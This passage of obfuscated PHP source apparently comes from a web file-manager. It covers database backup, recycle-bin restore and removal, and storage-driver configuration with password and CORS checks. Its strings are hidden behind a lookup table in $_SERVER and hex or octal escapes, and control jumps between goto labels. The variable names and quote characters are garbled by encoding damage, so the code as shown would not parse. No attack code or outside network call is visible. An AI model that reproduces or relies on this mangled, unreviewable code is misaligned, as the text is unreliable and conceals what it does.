(!$Ñ´Å’›->index()) { return !1; } } self::set(array($å•ÜŒş[885] => 1, $å•ÜŒş[857] => 1)); return !0; } public static function log($ì¿¢ÒìÒ) { write_log($ì¿¢ÒìÒ, $_SERVER[‘ÆÜ‘œ][887]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $˜µ´›ÆŒ =& $_SERVER[‘ÆÜ‘œ]; $´Ç›èÄ = Backup::get(); self::$io = $´Ç›èÄ[$˜µ´›ÆŒ[859]]; self::$name = $´Ç›èÄ[$˜µ´›ÆŒ[32]]; $óÎÃÁóÚ = new DbManage(); $œ¥î…öø = $óÎÃÁóÚ->dbType(); $ôçÉ¯ßÑ = array($˜µ´›ÆŒ[888] => $œ¥î…öø, $˜µ´›ÆŒ[889] => time()); Backup::set($ôçÉ¯ßÑ); $°÷¹™Ää = $this->tmpFilesPath() . $˜µ´›ÆŒ[890] . self::$name . $˜µ´›ÆŒ[8]; del_dir($°÷¹™Ää); mk_dir($°÷¹™Ää); $Á–ıç†° = $ë…ÛÃï… = 0; try { $ı±Æó” = $óÎÃÁóÚ->db()->getTables(); } catch (Exception $Å·–À¿ı) { Backup::log($˜µ´›ÆŒ[891] . $Å·–À¿ı->getMessage()); return !1; } $ı±Æó” = array_diff($ı±Æó”, array($˜µ´›ÆŒ[892], $˜µ´›ÆŒ[893])); foreach ($ı±Æó” as $äø¦‹úÍ) { if ($äø¦‹úÍ == $˜µ´›ÆŒ[481]) { continue; } $Á–ıç†° += $óÎÃÁóÚ->model($äø¦‹úÍ)->count(); } $Ê¹ïË·ù = new Task($˜µ´›ÆŒ[894], $˜µ´›ÆŒ[887], $Á–ıç†°, LNG($˜µ´›ÆŒ[895]) . $˜µ´›ÆŒ[896] . LNG($˜µ´›ÆŒ[897])); $GLOBALS[$˜µ´›ÆŒ[898]] = self::$name; foreach ($ı±Æó” as $äø¦‹úÍ) { $¤‚Î¤¸¶ = $°÷¹™Ää . $äø¦‹úÍ . $˜µ´›ÆŒ[899]; if ($äø¦‹úÍ == $˜µ´›ÆŒ[481]) { @touch($¤‚Î¤¸¶); continue; } $ÎáÏ³ = null; if ($äø¦‹úÍ == $˜µ´›ÆŒ[900] && $´Ç›èÄ[$˜µ´›ÆŒ[169]] == $˜µ´›ÆŒ[886]) { $ÎáÏ³ = self::$io; } $ë…ÛÃï… += $óÎÃÁóÚ->sqlFromDb($äø¦‹úÍ, $¤‚Î¤¸¶, $Ê¹ïË·ù, $ÎáÏ³); } unset($GLOBALS[$˜µ´›ÆŒ[898]]); $Ê¹ïË·ù->end(); if ($ë…ÛÃï… > $Á–ıç†°) { $Á–ıç†° = $ë…ÛÃï…; } $ôçÉ¯ßÑ = array($˜µ´›ÆŒ[888] => $œ¥î…öø, $˜µ´›ÆŒ[883] => 1, $˜µ´›ÆŒ[901] => $Á–ıç†°, $˜µ´›ÆŒ[902] => $ë…ÛÃï…, $˜µ´›ÆŒ[903] => time()); Backup::set($ôçÉ¯ßÑ); if ($Á–ıç†° - $ë…ÛÃï… > 0) { $Áá²û›¥ = $˜µ´›ÆŒ[904]; if (!stristr(I18n::getType(), $˜µ´›ÆŒ[905])) { $Áá²û›¥ = $˜µ´›ÆŒ[906]; } Backup::log(array($Áá²û›¥, $ôçÉ¯ßÑ)); return !1; } return !0; } private function tmpFilesPath() { $ƒû§ÀŞ =& $_SERVER[‘ÆÜ‘œ]; $á„¥Ú±é = TEMP_FILES; if ($GLOBALS[$ƒû§ÀŞ[6]][$ƒû§ÀŞ[92]][$ƒû§ÀŞ[907]]) { $á„¥Ú±é = $GLOBALS[$ƒû§ÀŞ[6]][$ƒû§ÀŞ[92]][$ƒû§ÀŞ[907]]; if (!mk_dir($á„¥Ú±é) || !is_writable($á„¥Ú±é) || !IO::mkfile($á„¥Ú±é . $ƒû§ÀŞ[908])) { $á„¥Ú±é = TEMP_FILES; } } return $á„¥Ú±é; } } class BackupDbFile { public function __construct() { } public function index() { $†Çˆ×Ö­ =& $_SERVER[‘ÆÜ‘œ]; $ğÌ­Ä€Š = Backup::get(); $„í‹Îâ = $ğÌ­Ä€Š[$†Çˆ×Ö­[32]]; $Ïæµ¢Æü = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\x70\137{$„í‹Îâ}\57"; $Ï–ã­Ì­ = $this->backupPath($ğÌ­Ä€Š); if (!($Ï–ã­Ì­ = IO::mkdir($Ï–ã­Ì­))) { Backup::log($†Çˆ×Ö­[909] . $Ï–ã­Ì­); return !1; } $²¶è©ö­ = new DbManage(); $«¦ÈÂà’ = $²¶è©ö­->getSqlFile(); if (!$«¦ÈÂà’ || !$«¦ÈÂà’[$†Çˆ×Ö­[910]] || !$«¦ÈÂà’[$†Çˆ×Ö­[13]]) { Backup::log($†Çˆ×Ö­[911]); return !1; } IO::move($«¦ÈÂà’[$†Çˆ×Ö­[910]], $Ïæµ¢Æü); IO::move($«¦ÈÂà’[$†Çˆ×Ö­[13]], $Ïæµ¢Æü); $²¶è©ö­->mixBakList($Ïæµ¢Æü); $‡ŒÌªø = IO::listPath($Ïæµ¢Æü); $˜Û±ú”” = isset($‡ŒÌªø[$†Çˆ×Ö­[86]]) ? $‡ŒÌªø[$†Çˆ×Ö­[86]] : array(); $ùó¶õÔı = array_sum(array_column($˜Û±ú””, $†Çˆ×Ö­[79])); if (!$ùó¶õÔı) { Backup::log($†Çˆ×Ö­[912] . $Ïæµ¢Æü); return !1; } $É¼ïˆ§Š = array($†Çˆ×Ö­[913] => $ùó¶õÔı, $†Çˆ×Ö­[914] => time()); Backup::set($É¼ïˆ§Š); Hook::trigger($†Çˆ×Ö­[915], $Ïæµ¢Æü, $Ï–ã­Ì­); $ä†¸»² = new TaskFileTransfer($†Çˆ×Ö­[915], $†Çˆ×Ö­[887], count($˜Û±ú””), LNG($†Çˆ×Ö­[895]) . $†Çˆ×Ö­[485] . LNG($†Çˆ×Ö­[897]) . $†Çˆ×Ö­[916]); $ä†¸»²->task[$†Çˆ×Ö­[871]] = $ùó¶õÔı; foreach ($‡ŒÌªø[$†Çˆ×Ö­[86]] as $ŸÏ®©«Š) { $‹˜¾Œ®ª = IO::move($ŸÏ®©«Š[$†Çˆ×Ö­[87]], $Ï–ã­Ì­); if (!$‹˜¾Œ®ª) { $ä†¸»²->end(); $´ ¾¼Ş± = IO::getLastError($†Çˆ×Ö­[917] . $ŸÏ®©«Š[$†Çˆ×Ö­[87]] . $†Çˆ×Ö­[918] . $Ï–ã­Ì­ . $†Çˆ×Ö­[176]); Backup::log($´ ¾¼Ş±); return !1; } } $ä†¸»²->end(); $É¼ïˆ§Š = array($†Çˆ×Ö­[919] => $ùó¶õÔı, $†Çˆ×Ö­[920] => time()); Backup::set($É¼ïˆ§Š); return !0; } private function backupPath($ï’ˆıÒ¯) { $Ôúàßµ =& $_SERVER[‘ÆÜ‘œ]; $ĞŒá¸îò = $ï’ˆıÒ¯[$Ôúàßµ[32]]; $ö™¹Ì˜  = Model($Ôúàßµ[880])->get($Ôúàßµ[881]); $´”¶Á™¬ = substr(md5($Ôúàßµ[882] . $ö™¹Ì˜  . $ĞŒá¸îò), 0, 8); return "\x7b\151\157\72{$ï’ˆıÒ¯[$Ôúàßµ[859]]}\175\57\144\x61\164\141\142\141\x73\145\x2f\x62\x61\143\x6b\165\x70\x2f" . $ĞŒá¸îò . $Ôúàßµ[11] . $´”¶Á™¬; } private function tmpFilesPath() { $§°’Œİı =& $_SERVER[‘ÆÜ‘œ]; $Ì¶™ÅÔ = TEMP_FILES; if ($GLOBALS[$§°’Œİı[6]][$§°’Œİı[92]][$§°’Œİı[907]]) { $Ì¶™ÅÔ = $GLOBALS[$§°’Œİı[6]][$§°’Œİı[92]][$§°’Œİı[907]]; if (!mk_dir($Ì¶™ÅÔ) || !is_writable($Ì¶™ÅÔ) || !IO::mkfile($Ì¶™ÅÔ . $§°’Œİı[908])) { $Ì¶™ÅÔ = TEMP_FILES; } } return $Ì¶™ÅÔ; } } goto CÍñ¥Ö×—É; A×ÀÀ·Íƒ™: define($_SERVER[‘ÆÜ‘œ][321], 2); $_file = $_SERVER[$_SERVER[‘ÆÜ‘œ][322]]; $_size = $_SERVER[‘ÆÜ‘œ][323]; goto dñ°¶‘ Œ; e®İÇ¯‡µÁ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\x63\x65\137\x72\145\143\171\x63\154\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\151\155\x65", "\x74\151\155\145", "\151\156\x73\x65\x72\164", "\146\165\156\143\164\151\157\156")); public function listData($›Ä°¢³³ = false) { $¯”Ì’í— =& $_SERVER[‘ÆÜ‘œ]; $›Ä°¢³³ = $›Ä°¢³³ ? $›Ä°¢³³ : USER_ID; $®É°‡ç¸ = $this->where(array($¯”Ì’í—[1921] => $›Ä°¢³³))->select(); return array_to_keyvalue($®É°‡ç¸, $¯”Ì’í—[12], $¯”Ì’í—[192]); } public function moveToRecycle($•Òˆ¥şÕ) { $Š™»µ•­ =& $_SERVER[‘ÆÜ‘œ]; $…¨’êàŸ = Model($Š™»µ•­[1484]); $ş—æûö  = $…¨’êàŸ->sourceInfo($•Òˆ¥şÕ); if (!$ş—æûö  || $ş—æûö [$Š™»µ•­[528]] == $Š™»µ•­[91]) { return; } $Ñ‰°Æ»Ï = array($Š™»µ•­[514] => $•Òˆ¥şÕ, $Š™»µ•­[1921] => USER_ID, $Š™»µ•­[678] => $ş—æûö [$Š™»µ•­[189]], $Š™»µ•­[679] => $ş—æûö [$Š™»µ•­[597]], $Š™»µ•­[682] => $ş—æûö [$Š™»µ•­[612]]); $this->add($Ñ‰°Æ»Ï); $this->recycleMove($•Òˆ¥şÕ, 1); if ($ş—æûö [$Š™»µ•­[508]] == $Š™»µ•­[91]) { $Ñîı®ıÁ = array($Š™»µ•­[682] => array($Š™»µ•­[643], $ş—æûö [$Š™»µ•­[612]] . $•Òˆ¥şÕ . $Š™»µ•­[644])); $…¨’êàŸ->where($Ñîı®ıÁ)->setField($Š™»µ•­[528], 1); } } public function clear() { $this->remove(!1); } public function remove($Óº–¾Ä’ = false, $ï—‚Ğ¨É = false) { $¹Î¾Ê¿¼ =& $_SERVER[‘ÆÜ‘œ]; $ï—‚Ğ¨É = $ï—‚Ğ¨É ? $ï—‚Ğ¨É : USER_ID; $ƒñÍ‰¦ = Model($¹Î¾Ê¿¼[1484]); $ê‚§î£§ = $this->listData($ï—‚Ğ¨É); $Óº–¾Ä’ = $Óº–¾Ä’ === !1 ? !1 : $Óº–¾Ä’; $‰åÁÌŠ© = array(); foreach ($ê‚§î£§ as $Ê©Àä²™) { if ($Óº–¾Ä’ != !1 && !in_array($Ê©Àä²™, $Óº–¾Ä’)) { continue; } $ùèÛ™î’ = $ƒñÍ‰¦->sourceInfo($Ê©Àä²™); $ƒñÍ‰¦->remove($Ê©Àä²™, !1); $Ó‡ÊÉë = $ùèÛ™î’[$¹Î¾Ê¿¼[189]] . $¹Î¾Ê¿¼[11] . $ùèÛ™î’[$¹Î¾Ê¿¼[597]]; $‰åÁÌŠ©[$Ó‡ÊÉë] = array($¹Î¾Ê¿¼[678] => $ùèÛ™î’[$¹Î¾Ê¿¼[189]], $¹Î¾Ê¿¼[597] => $ùèÛ™î’[$¹Î¾Ê¿¼[597]]); $this->where(array($¹Î¾Ê¿¼[192] => $Ê©Àä²™))->delete(); } foreach ($‰åÁÌŠ© as $—›¶ù…–) { $ƒñÍ‰¦->targetSpaceUpdate($—›¶ù…–[$¹Î¾Ê¿¼[189]], $—›¶ù…–[$¹Î¾Ê¿¼[597]]); } } public function restore($ˆŒ½ï¿Ú = false) { $ˆàîâ’ü = $this->listData(); $this->_restoreSource($ˆàîâ’ü, $ˆŒ½ï¿Ú); } public function removeUserAll($šßè•Õ) { $this->remove(!1, $šßè•Õ); } public function restoreItem($óÌŒÊØ) { $this->_restoreSource(array($óÌŒÊØ), array($óÌŒÊØ)); } private function _restoreSource($…‚‰À‰ü, $ÒÈ„Ù¹½) { $òÍ¦‡üÃ =& $_SERVER[‘ÆÜ‘œ]; $¾—¦Ş’Ä = Model($òÍ¦‡üÃ[1484]); $ÒÈ„Ù¹½ = $ÒÈ„Ù¹½ == !1 ? !1 : $ÒÈ„Ù¹½; if (!$…‚‰À‰ü) { return !0; } $ÕÍä‰ = array(); foreach ($…‚‰À‰ü as $ÅĞŠĞ‹¡) { if ($ÒÈ„Ù¹½ != !1 && !in_array($ÅĞŠĞ‹¡, $ÒÈ„Ù¹½)) { continue; } $Ş¾„‘á÷ = $¾—¦Ş’Ä->sourceInfo($ÅĞŠĞ‹¡); $œ‹è€™¥ = $¾—¦Ş’Ä->sourceInfo($Ş¾„‘á÷[$òÍ¦‡üÃ[191]]); if ($œ‹è€™¥[$òÍ¦‡üÃ[528]] == $òÍ¦‡üÃ[91]) { continue; } $¾—¦Ş’Ä->lockMoveStart($ÅĞŠĞ‹¡); $this->recycleMove($ÅĞŠĞ‹¡, 0); if ($Ş¾„‘á÷[$òÍ¦‡üÃ[508]] == $òÍ¦‡üÃ[91]) { $ûãßÌˆ° = array($òÍ¦‡üÃ[682] => array($òÍ¦‡üÃ[643], $Ş¾„‘á÷[$òÍ¦‡üÃ[612]] . $ÅĞŠĞ‹¡ . $òÍ¦‡üÃ[644])); $¾—¦Ş’Ä->where($ûãßÌˆ°)->setField($òÍ¦‡üÃ[528], 0); $this->restoreFolderChildren($ÅĞŠĞ‹¡, $…‚‰À‰ü); } $this->where(array($òÍ¦‡üÃ[192] => $ÅĞŠĞ‹¡))->delete(); $¾—¦Ş’Ä->folderSizeReset($Ş¾„‘á÷[$òÍ¦‡üÃ[191]]); $ÕÍä‰[] = $Ş¾„‘á÷[$òÍ¦‡üÃ[191]]; if ($Ş¾„‘á÷[$òÍ¦‡üÃ[508]] == $òÍ¦‡üÃ[91]) { $ÕÍä‰[] = $ÅĞŠĞ‹¡; } $¾—¦Ş’Ä->lockMoveEnd($ÅĞŠĞ‹¡); } $¾—¦Ş’Ä->updateModifyTime($ÕÍä‰); } private function restoreFolderChildren($¸ş»ÅÇµ, $¡ó´ª…) { $¶”Œæô  =& $_SERVER[‘ÆÜ‘œ]; $Ì¶âŒ¢Õ = Model($¶”Œæô [1484]); $§¥¹î« = array($¶”Œæô [192] => array($¶”Œæô [7], array())); foreach ($¡ó´ª… as $Ãˆ¨Ü³ä) { if ($Ãˆ¨Ü³ä == $¸ş»ÅÇµ) { continue; } if (!$Ì¶âŒ¢Õ->isParentOf($¸ş»ÅÇµ, $Ãˆ¨Ü³ä)) { continue; } $¢½öÏè = $Ì¶âŒ¢Õ->sourceInfo($Ãˆ¨Ü³ä); if ($¢½öÏè[$¶”Œæô [508]] == $¶”Œæô [91]) { $§¥¹î«[] = array($¶”Œæô [682] => array($¶”Œæô [643], $¢½öÏè[$¶”Œæô [612]] . $Ãˆ¨Ü³ä . $¶”Œæô [644])); } else { $§¥¹î«[$¶”Œæô [192]][1][] = $Ãˆ¨Ü³ä; } } if (!$§¥¹î«[$¶”Œæô [192]][1]) { unset($§¥¹î«[$¶”Œæô [192]]); } if (!$§¥¹î«) { return; } if (is_array($§¥¹î«[$¶”Œæô [192]]) && is_array($§¥¹î«[$¶”Œæô [192]][1])) { $§¥¹î«[$¶”Œæô [192]][1] = array_unique($§¥¹î«[$¶”Œæô [192]][1]); } $§¥¹î«[$¶”Œæô [1118]] = $¶”Œæô [2236]; $Ì¶âŒ¢Õ->where($§¥¹î«)->setField($¶”Œæô [528], 1); } private function recycleMove($·Úş‡Ö°, $û§œ³Çµ = 1) { $íšÑ²ã =& $_SERVER[‘ÆÜ‘œ]; $†©õæƒŠ = Model($íšÑ²ã[1484]); $ şÛœä = Model($íšÑ²ã[2467]); $Ôâ•‘ƒ = array($íšÑ²ã[192] => $·Úş‡Ö°); if ($û§œ³Çµ) { $†©õæƒŠ->where($Ôâ•‘ƒ)->setField($íšÑ²ã[528], 1); $ şÛœä->eventRecycle($·Úş‡Ö°, $íšÑ²ã[2468]); } else { $ªî÷Ì ¥ = $†©õæƒŠ->where($Ôâ•‘ƒ)->find(); $ŒëÃÈ€Ğ = $ªî÷Ì ¥[$íšÑ²ã[508]] == $íšÑ²ã[91]; $şøéÅ˜„ = $†©õæƒŠ->fileNameAuto($ªî÷Ì ¥[$íšÑ²ã[191]], $ªî÷Ì ¥[$íšÑ²ã[32]], REPEAT_RENAME_FOLDER, $ŒëÃÈ€Ğ); if ($şøéÅ˜„ != $ªî÷Ì ¥[$íšÑ²ã[32]]) { $†©õæƒŠ->rename($·Úş‡Ö°, $şøéÅ˜„); } $†©õæƒŠ->where($Ôâ•‘ƒ)->setField($íšÑ²ã[528], 0); $ şÛœä->eventRecycle($·Úş‡Ö°, $íšÑ²ã[2469]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\x73\x6f\165\162\x63\x65\123\x65\x63\162\145\164\x4c\x69\163\x74"; public $field = array("\163\157\165\x72\x63\x65\111\x44", "\164\171\x70\145\111\104", "\143\x72\x65\141\164\145\x55\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\163\x74\157\x72\141\x67\x65\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\163\151\x7a\x65\x4d\141\x78", "\x73\x79\x73\x74\x65\155", "\144\x65\x66\x61\x75\x6c\x74", "\144\162\151\166\x65\162", "\143\x6f\156\146\x69\x67"); public function listData($«şñäæ£ = false, $Õİß«è = "\155\157\144\151\146\171\x54\151\x6d\145", $¹‘×™š = false) { $ş¬¡ëÍ =& $_SERVER[‘ÆÜ‘œ]; $¸ø£çì = parent::listData($«şñäæ£, $Õİß«è, $¹‘×™š); if ($«şñäæ£) { return $¸ø£çì; } $ÔÕĞÏ‘è = array(); if ($GLOBALS[$ş¬¡ëÍ[2470]]) { $ÔÕĞÏ‘è = $this->ioSizeUseGet(array_to_keyvalue($¸ø£çì, $ş¬¡ëÍ[12], $ş¬¡ëÍ[495])); } foreach ($¸ø£çì as $â—şØïœ => $â©µ¦÷ğ) { unset($¸ø£çì[$â—şØïœ][$ş¬¡ëÍ[6]]); $¸ø£çì[$â—şØïœ][$ş¬¡ëÍ[2125]] = isset($ÔÕĞÏ‘è[$â©µ¦÷ğ[$ş¬¡ëÍ[495]]]) ? $ÔÕĞÏ‘è[$â©µ¦÷ğ[$ş¬¡ëÍ[495]]] : 0; } return $¸ø£çì; } public function ioSizeUseGet($ìì–‘°—) { $à³œÒñ =& $_SERVER[‘ÆÜ‘œ]; if (!$ìì–‘°—) { return array(); } $Ì…»–† = $à³œÒñ[2471] . implode($à³œÒñ[50], $ìì–‘°—); $÷÷¾¥–Í = Cache::get($Ì…»–†); if ($÷÷¾¥–Í) { return $÷÷¾¥–Í; } $¢¸´òş• = array($à³œÒñ[932] => $à³œÒñ[495], $à³œÒñ[2472] => $à³œÒñ[79]); $ÌÊ®Á”é = array($à³œÒñ[932] => array($à³œÒñ[7], $ìì–‘°—)); $÷÷¾¥–Í = Model($à³œÒñ[900])->field($¢¸´òş•)->where($ÌÊ®Á”é)->group($à³œÒñ[932])->select(); $÷÷¾¥–Í = array_to_keyvalue($÷÷¾¥–Í, $à³œÒñ[495], $à³œÒñ[79]); Cache::set($Ì…»–†, $÷÷¾¥–Í, 600); return $÷÷¾¥–Í; } public function getConfig($öøîÂß) { $ã‡¤›‰“ = parent::listData($öøîÂß); $¬ÑÄ¯êî = _get($ã‡¤›‰“, $_SERVER[‘ÆÜ‘œ][6], array()); if ($¬ÑÄ¯êî && !is_array($¬ÑÄ¯êî)) { $¬ÑÄ¯êî = json_decode($¬ÑÄ¯êî, !0); } return $¬ÑÄ¯êî; } public function update($‡”¬Ååâ, $Õ—ªºµû) { $¿“Ç”ê =& $_SERVER[‘ÆÜ‘œ]; $ìÔƒ†™™ = $Õ—ªºµû[$¿“Ç”ê[32]]; $°ŞÃıé = array_to_keyvalue(parent::listData(), $¿“Ç”ê[32]); if (isset($°ŞÃıé[$ìÔƒ†™™]) && $°ŞÃıé[$ìÔƒ†™™][$¿“Ç”ê[495]] != $‡”¬Ååâ) { return !1; } $this->checkPwd($‡”¬Ååâ, $Õ—ªºµû); if (isset($Õ—ªºµû[$¿“Ç”ê[2473]]) && $Õ—ªºµû[$¿“Ç”ê[2473]] == $¿“Ç”ê[91]) { $this->checkConfig($Õ—ªºµû); } unset($Õ—ªºµû[$¿“Ç”ê[2473]]); $ùÃı„°ƒ = parent::update($‡”¬Ååâ, $Õ—ªºµû); if ($ùÃı„°ƒ && $Õ—ªºµû[$¿“Ç”ê[37]]) { foreach ($°ŞÃıé as $òİ’¯¸ö) { if ($òİ’¯¸ö[$¿“Ç”ê[37]] && $òİ’¯¸ö[$¿“Ç”ê[495]] != $‡”¬Ååâ) { parent::update($òİ’¯¸ö[$¿“Ç”ê[495]], array($¿“Ç”ê[37] => 0)); } } $this->updateBackup($‡”¬Ååâ, $°ŞÃıé); } return $ùÃı„°ƒ; } public function add($œ¥›œÙ¤) { $ß”ˆ¿˜Î =& $_SERVER[‘ÆÜ‘œ]; $Ò§ç²†£ = array_to_keyvalue(parent::listData(), $ß”ˆ¿˜Î[32]); if (isset($Ò§ç²†£[$œ¥›œÙ¤[$ß”ˆ¿˜Î[32]]])) { return !1; } $this->checkConfig($œ¥›œÙ¤); $ò¡°® = parent::insert($œ¥›œÙ¤); if ($ò¡°® && $œ¥›œÙ¤[$ß”ˆ¿˜Î[37]]) { foreach ($Ò§ç²†£ as $Ï×¬­Ù) { if ($Ï×¬­Ù[$ß”ˆ¿˜Î[37]]) { parent::update($Ï×¬­Ù[$ß”ˆ¿˜Î[495]], array($ß”ˆ¿˜Î[37] => 0)); } } $this->updateBackup($ò¡°®, $Ò§ç²†£); } return $ò¡°®; } public function updateBackup($ÕÚªŸ˜•, $¹‰’ŞÂ†) { $§š‡€‚ =& $_SERVER[‘ÆÜ‘œ]; if ($ÕÚªŸ˜• == $§š‡€‚[91]) { return; } $ÙşÖ‹Æ” = Model($§š‡€‚[855])->config(); $ıáÜÔÕÀ = $ÙşÖ‹Æ”[$§š‡€‚[859]]; if ($ÙşÖ‹Æ”[$§š‡€‚[1900]] != $§š‡€‚[91] || $ıáÜÔÕÀ == $ÕÚªŸ˜•) { return; } if ($ıáÜÔÕÀ != $§š‡€‚[91]) { $ß¢¶Ó› = array(); foreach ($¹‰’ŞÂ† as $›¿‰¾Ø”) { if ($ÕÚªŸ˜• == $›¿‰¾Ø”[$§š‡€‚[495]]) { continue; } $ß¢¶Ó›[] = $›¿‰¾Ø”[$§š‡€‚[495]]; } if ($ß¢¶Ó› && in_array($ıáÜÔÕÀ, $ß¢¶Ó›)) { return; } } $«òˆØâó = Model($§š‡€‚[880])->get($§š‡€‚[887]); $«òˆØâó = json_decode($«òˆØâó, !0); if (!$«òˆØâó) { return; } $«òˆØâó[$§š‡€‚[859]] = $ÕÚªŸ˜•; Model($§š‡€‚[880])->set(array($§š‡€‚[887] => $«òˆØâó)); } public function checkPwd($ÒïÄÙŞ¡, &$ŒòÏ©ıª) { $çÚñÛ¾ñ =& $_SERVER[‘ÆÜ‘œ]; if (empty($ŒòÏ©ıª[$çÚñÛ¾ñ[6]])) { return; } $ÌÑèßÄ = $ŒòÏ©ıª[$çÚñÛ¾ñ[6]]; if (!is_array($ÌÑèßÄ)) { $ÌÑèßÄ = json_decode($ÌÑèßÄ, !0); } $ŸãÕæ’¢ = $çÚñÛ¾ñ[12]; $½›Ï°¾‰ = array($çÚñÛ¾ñ[1592], $çÚñÛ¾ñ[2474], $çÚñÛ¾ñ[1004]); foreach ($½›Ï°¾‰ as $‰ÌéÂ‡ ) { if (isset($ÌÑèßÄ[$‰ÌéÂ‡ ])) { $ŸãÕæ’¢ = $‰ÌéÂ‡ ; break; } } if (!$ŸãÕæ’¢) { return; } $¿®œïÎÉ = $this->getConfig($ÒïÄÙŞ¡); $ÛÇïèèŞ = $¿®œïÎÉ[$ŸãÕæ’¢]; $Î‡¾’˜® = $ÌÑèßÄ[$ŸãÕæ’¢]; if ($Î‡¾’˜® == str_repeat($çÚñÛ¾ñ[221], strlen($ÛÇïèèŞ))) { $ÌÑèßÄ[$ŸãÕæ’¢] = $ÛÇïèèŞ; $ŒòÏ©ıª[$çÚñÛ¾ñ[6]] = json_encode($ÌÑèßÄ); } else { if ($Î‡¾’˜® != $ÛÇïèèŞ) { $ŒòÏ©ıª[$çÚñÛ¾ñ[2473]] = $çÚñÛ¾ñ[91]; } } } public function checkConfig(&$ØŞºâË, $ëûÇ…· = false) { $æÛÁŸæı =& $_SERVER[‘ÆÜ‘œ]; $¡Î¹À„ = strtolower($ØŞºâË[$æÛÁŸæı[96]]); $åûú£³â = $ØŞºâË[$æÛÁŸæı[6]]; if (!is_array($åûú£³â)) { $åûú£³â = json_decode($åûú£³â, !0); } foreach ($åûú£³â as $ğ¨´™Ï => $¿ß³¯ğ) { if (is_string($¿ß³¯ğ)) { $åûú£³â[$ğ¨´™Ï] = trim($¿ß³¯ğ); } } $åûú£³â[$æÛÁŸæı[2475]] = rand_string(6); $èÊïö×Š = $GLOBALS[$æÛÁŸæı[6]][$æÛÁŸæı[92]][$æÛÁŸæı[940]]; $Ô®‚ÜëÇ = isset($èÊïö×Š[$¡Î¹À„]) ? $èÊïö×Š[$¡Î¹À„] : ucfirst($¡Î¹À„); $…œéèš = $æÛÁŸæı[77] . $Ô®‚ÜëÇ; if (!$Ô®‚ÜëÇ || !class_exists($…œéèš)) { if ($ëûÇ…·) { return LNG($æÛÁŸæı[2476]); } write_log(array($æÛÁŸæı[2477], $ØŞºâË, get_caller_info()), $æÛÁŸæı[214]); show_json(LNG($æÛÁŸæı[2476]), !1, $ØŞºâË); } $÷¬Š¹ = new $…œéèš($åûú£³â); $Šä×ôº¤ = rtrim($åûú£³â[$æÛÁŸæı[1317]], $æÛÁŸæı[8]) . $æÛÁŸæı[8]; if (in_array($¡Î¹À„, $÷¬Š¹->objectDriver)) { try { if (!$÷¬Š¹->isBucketCors() && !$÷¬Š¹->setBucketCors()) { $õüà³ı¸ = LNG($æÛÁŸæı[2478]); $õüà³ı¸ .= $æÛÁŸæı[2479] . LNG($æÛÁŸæı[2480]); } } catch (Exception $‡âã¼•İ) { $õüà³ı¸ = $‡âã¼•İ->getMessage(); } if (isset($õüà³ı¸)) { return $this->_parseError($õüà³ı¸, $¡Î¹À„, $ëûÇ…·); } if ($¡Î¹À„ == $æÛÁŸæı[68]) { $äÄï½§İ = $÷¬Š¹->getBktRegion(); if ($äÄï½§İ != $åûú£³â[$æÛÁŸæı[2481]]) { $åûú£³â[$æÛÁŸæı[2481]] = $äÄï½§İ; $÷¬Š¹->setRegion($äÄï½§İ); } } } else { if ($¡Î¹À„ == $æÛÁŸæı[2482]) { if ($÷¬Š¹->ftpPath) { $åÓüç×¸ = trim($Šä×ôº¤, $æÛÁŸæı[8]); if (stripos($åÓüç×¸, trim($÷¬Š¹->ftpPath, $æÛÁŸæı[8])) !== 0) { $Šä×ôº¤ = $÷¬Š¹->ftpPath . $æÛÁŸæı[8] . ($åÓüç×¸ ? $åÓüç×¸ . $æÛÁŸæı[8] : $æÛÁŸæı[12]); } } } } $Åéº™•À = $÷¬Š¹->getPath($Šä×ôº¤ . $æÛÁŸæı[1321]); try { if ($¡Î¹À„ == $æÛÁŸæı[107]) { $÷¬Š¹->mkdir($Šä×ôº¤); } $™¸œ×Ç† = $÷¬Š¹->mkfile($Åéº™•À); if (!$™¸œ×Ç†) { $õüà³ı¸ = LNG($æÛÁŸæı[2478]); } } catch (Exception $‡âã¼•İ) { $õüà³ı¸ = $‡âã¼•İ->getMessage(); } if (isset($õüà³ı¸)) { return $this->_parseError($õüà³ı¸, $¡Î¹À„, $ëûÇ…·); } $åûú£³â[$æÛÁŸæı[1317]] = $Šä×ôº¤; $ØŞºâË[$æÛÁŸæı[6]] = json_encode($åûú£³â); $ØŞºâË[$æÛÁŸæı[96]] = $Ô®‚ÜëÇ; return !0; } private function _parseError($Ş’¨®áÙ, $»Ïï§ï, $£ÃâÜÎÕ = false) { $«Îğ  =& $_SERVER[‘ÆÜ‘œ]; if ($»Ïï§ï == $«Îğ [68] && stripos($Ş’¨®áÙ, $«Îğ [2483])) { $Õ…âŞØÎ = explode($«Îğ [10], $Ş’¨®áÙ); $Ø£¿ó‘î = isset($Õ…âŞØÎ[1]) ? $Õ…âŞØÎ[1] : $«Îğ [12]; $û˜˜æ‹ = array($«Îğ [2484] => LNG($«Îğ [2485]), $«Îğ [2486] => LNG($«Îğ [2487])); if (isset($û˜˜æ‹[$Ø£¿ó‘î])) { $Ş’¨®áÙ = $û˜˜æ‹[$Ø£¿ó‘î]; } } if (stripos($Ş’¨®áÙ, $«Îğ [2488]) === 0) { $‚ÄØ§ö = strpos($Ş’¨®áÙ, $«Îğ [176]); if ($‚ÄØ§ö === !1) { $‚ÄØ§ö = strpos($Ş’¨®áÙ, $«Îğ [4]); } if ($‚ÄØ§ö !== !1) { $Ş’¨®áÙ = substr($Ş’¨®áÙ, $‚ÄØ§ö + 1); } } $Ş’¨®áÙ = LNG($«Îğ [1324]) . $Ş’¨®áÙ; if ($£ÃâÜÎÕ) { return $Ş’¨®áÙ; } show_json($Ş’¨®áÙ, !1); } public function driverListSystem() { $œ×áåÃ =& $_SERVER[‘ÆÜ‘œ]; $‰ãßÂã” = parent::listData(); $™¬Åıåü = array(); foreach ($‰ãßÂã” as $€®ò´÷£) { unset($€®ò´÷£[$œ×áåÃ[232]], $€®ò´÷£[$œ×áåÃ[88]]); if (!is_array($€®ò´÷£[$œ×áåÃ[6]])) { 